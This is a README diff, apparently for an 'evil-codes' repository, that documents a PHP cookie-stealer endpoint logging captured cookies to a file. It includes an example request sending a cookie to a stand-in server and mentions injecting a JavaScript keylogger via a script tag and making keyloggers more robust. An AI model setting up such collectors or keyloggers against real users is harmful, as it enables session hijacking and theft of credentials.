@@ -46,6 +46,18 @@ cd evil-codes</code></pre>
               <li><b>How to use:</b>
                 <ul><li>Place the JavaScript file containing the keylogger code into an HTML file, or link it via a &lt;script> tag</ul>
 </ol>
+<h2 align='center'>Cookie Stealer (.php)</h2>
+              <li><b>Description:</b> This project is a simple PHP script that captures and logs cookies sent via URL parameters. The script is intended for educational and ethical purposes, such as security research and demonstration of cookie handling in web                           applications. It logs any <code>cookie</code> parameter passed through a GET request to a local file named <code>stolen_cookies.txt</code> in the same directory. Each log entry is timestamped for easy reference.
+              <li><b>Warning:</b> This script should only be used in controlled environments and with permission. Unauthorized use of this tool to capture cookies is illegal and unethical.
+              <li><b>How It Works:</b>
+                <ol>
+                  <li>The script checks for a URL parameter named <code>cookie</code>
+                  <li>If <code>cookie</code> is present, its value is saved to a file <code>stolen_cookies.txt</code> along with the current timestamp
+                  <li>If the parameter is missing, the script simply returns a message saying "No cookie"
+                </ol>
+              <li><b>Example:</b>
+                To log a cookie with a value of example_cookie_value, make a GET request like this:
+                <pre><code>http://your-server.com/cookie-stealer.php?cookie=example_cookie_value</code></pre>
 <h2 align='center'>Future Improvements:</h2>
 <ul>
   <li><b>Security Enhancements:</b> Aim to make the keyloggers more robust and add encryption to protect the captured logs
